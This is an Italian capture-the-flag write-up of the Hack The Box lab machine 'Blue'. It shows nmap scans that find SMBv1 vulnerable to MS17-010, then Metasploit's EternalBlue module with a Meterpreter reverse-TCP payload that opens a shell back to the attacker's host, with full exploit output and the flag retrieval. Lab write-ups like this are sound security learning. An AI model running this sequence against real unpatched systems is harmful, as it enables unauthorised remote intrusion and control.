---
layout: default
---

# Blue (HTB)

Come primo approccio lancio una scansione TCP SYN sulle porte con <span style="color:#46eac7">nmap</span>, dove cerco di farmi dare anche la versione dei servizi.

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV 10.10.10.40  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-19 10:43 EST
Nmap scan report for 10.10.10.40
Host is up (0.044s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[--SNIP--]
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.46 seconds
```
\
Noto subito la <span style="color:#46eac7">porta 445</span> per il <span style="color:#46eac7">protocollo SMB</span>, in tandem con la 139 per il protocollo NetBIOS. Lancio quindi una nuova scansione utilizzando gli script <span style="color:#46eac7">smb-os-discovery</span> e <span style="color:#46eac7">smb-protocols</span> per ottenere qualche informazione in più.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 445 --script smb-os-discovery,smb-protocols 10.10.10.40
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-19 10:48 EST
Nmap scan report for 10.10.10.40
Host is up (0.044s latency).

PORT    STATE SERVICE
445/tcp open  microsof0

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2:0:2
|_    2:1:0
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-11-19T16:02:19+00:00

Nmap done: 1 IP address (1 host up) scanned in 5.61 seconds
```
\
A questo punto eseguo una ricerca online con le parole chiave <span style="color:#46eac7">windows 7 sp1 smbv1 vulnerabilities</span> e sul sito <a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010" target="_blank">Microsoft</a> trovo un elenco di vulnerabilità critiche. Utilizzo ancora una volta <span style="color:#46eac7">nmap</span> per verificare se è in grado di rilevare qualche vulnerabilità con lo script <span style="color:#46eac7">vuln</span>.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p 445 --script vuln 10.10.10.40
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-19 11:11 EST
Nmap scan report for 10.10.10.40
Host is up (0.044s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: NT_STATUS_OBJECT_NAME_NOT_FOUND
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-054: false

Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
```
\
Individuata la <span style="color:#46eac7">CVE-2017-0143</span>, dopo una ricerca su <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143" target="_blank">Mitre</a>, trovo un riferimento ad un modulo di Metasploit <span style="color:#46eac7">auxiliary/scanner/smb/smb_ms17_010</span> su <a href="https://www.exploit-db.com/exploits/41891" target="_blank">Exploit DB</a>. Mi studio quindi le opzioni del modulo di scansione per impostare i parametri correttamente (in questo caso solo <span style="color:#46eac7">RHOST</span>), e provo ad eseguirlo sull'host target.

```bash
┌──(kali㉿kali)-[~]
└─$ msfconsole -q
msf6 > search smb_ms17_010

Matching Modules
================

   #  Name                                Disclosure Date  Rank    Check  Description
   -  ----                                ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_ms17_010                   normal  No     MS17-010 SMB RCE Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_ms17_010

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_ms17_010) > options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                    Required  Description
   ----         ---------------                                    --------  -----------
   CHECK_ARCH   true                                               no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                               no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                              no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/na  yes       List of named pipes to check
                med_pipes.txt
   RHOSTS                                                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-meta
                                                                             sploit.html
   RPORT        445                                                yes       The SMB service port (TCP)
   SMBDomain    .                                                  no        The Windows domain to use for authentication
   SMBPass                                                         no        The password for the specified username
   SMBUser                                                         no        The username to authenticate as
   THREADS      1                                                  yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOST 10.10.10.40
RHOST => 10.10.10.40
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
\
Una volta eseguita la scansione l'output mi indica che l'host è <span style="color:#46eac7">vulnerabile a MS17-010</span>, con una rapida ricerca online trovo che la vulnerabilità è quella sfruttata dal noto exploit <a href="https://it.wikipedia.org/wiki/EternalBlue" target="_blank">EternalBlue</a>, del quale avrei dovuto ricordarmi subito.

```bash
msf6 auxiliary(scanner/smb/smb_ms17_010) > search MS17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(scanner/smb/smb_ms17_010) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded S
                                             tandard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Stand
                                             ard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 targ
                                             et machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.10.10.40
RHOST => 10.10.10.40
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.17
LHOST => 10.10.14.17
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```
\
Arrivati a questo punto, per quella che è la mia esperienza, ho notato che spesso nei writeup vengono "snippati" i blocchi di codice che Metasploit esegue automaticamente. Personalmente invece, quando mi è possibile farlo, preferisco cercare di capire, almeno a grandi linee, come funziona l'exploit che sto usando, penso quindi che sia interessante lasciare l'output prodotto. Ho trovato molto interessante anche un <a href="http://www.cs.toronto.edu/~arnold/427/18s/427_18S/indepth/EternalBlue/EternalBlue_report.pdf" target="_blank">articolo</a> che spiega il funzionamento dell'exploit.

```bash
[*] Started reverse TCP handler on 10.10.14.17:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.10.40:445 - The target is vulnerable.
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Sending stage (200774 bytes) to 10.10.10.40
[*] Meterpreter session 1 opened (10.10.14.17:4444 -> 10.10.10.40:49160) at 2023-11-19 14:43:25 -0500
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > pwd
C:\Windows\system32
```
\
Ora che sono dentro al sistema target procedo ad esplorarlo un po'. Trovare le flag di <span style="color:#46eac7">user</span> e <span style="color:#46eac7">root</span> è molto semplice.

```bash
meterpreter > cd \C:\\\

[--SNIP--]

meterpreter > ls
Listing: C:\Users\haris\Desktop
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-15 03:58:32 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-11-17 11:37:56 -0500  user.txt

meterpreter > cat user.txt 
********************************

[--SNIP--]

meterpreter > ls
Listing: C:\Users\Administrator\Desktop
=======================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2017-07-21 02:56:40 -0400  desktop.ini
100444/r--r--r--  34    fil   2023-11-17 11:37:56 -0500  root.txt

meterpreter > cat root.txt 
********************************
```